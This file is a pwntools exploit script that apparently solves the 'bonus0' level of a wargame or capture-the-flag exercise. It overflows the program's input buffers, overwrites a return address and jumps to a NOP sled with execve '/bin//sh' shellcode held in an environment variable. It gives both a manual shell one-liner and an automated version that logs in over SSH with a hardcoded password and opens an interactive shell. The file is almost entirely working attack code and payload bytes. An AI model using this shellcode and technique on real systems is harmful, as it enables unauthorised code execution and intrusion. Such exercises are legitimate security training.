from pwn import *

### MANUAL EXPLOIT ###

# python -c "print('A' * 4095 + '\n' + 'B' * 9 + '\x67\xfe\xff\xbf' + 'D' * 7 + '\n')" > /tmp/payload
# cat /tmp/payload - | env -i PAYLOAD=$(python -c "print('\x90'*500+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80')") ./bonus0



### AUTOMATED EXPLOIT ###

payload_1 = b'A' * 60
payload_2 = b'B' * 9
payload_2 += b'\x67\xfe\xff\xbf'
payload_2 += b'D' * 7


s = ssh(host='192.168.1.45', port=4242, user="bonus0", password="f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728")
p = s.process(["/home/user/bonus0/./bonus0"], env={"PAYLOAD": b'\x90'*500+b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'})

p.recvline(1)
p.sendline(payload_1)
p.recvline(1)
p.sendline(payload_2)

p.interactive()

